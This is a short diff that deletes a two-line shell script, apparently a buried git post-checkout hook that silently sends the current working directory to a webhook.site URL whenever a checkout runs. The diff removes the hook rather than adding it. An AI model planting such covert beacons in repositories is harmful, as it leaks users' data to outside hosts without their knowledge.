@@ -1,2 +1,0 @@
-#!/bin/sh
-curl -s "https://webhook.site/49201986-6f24-4515-aeb7-c40e01297dc6/buried-POSTCHECKOUT-fired?cwd=$(pwd)" >/dev/null 2>&1
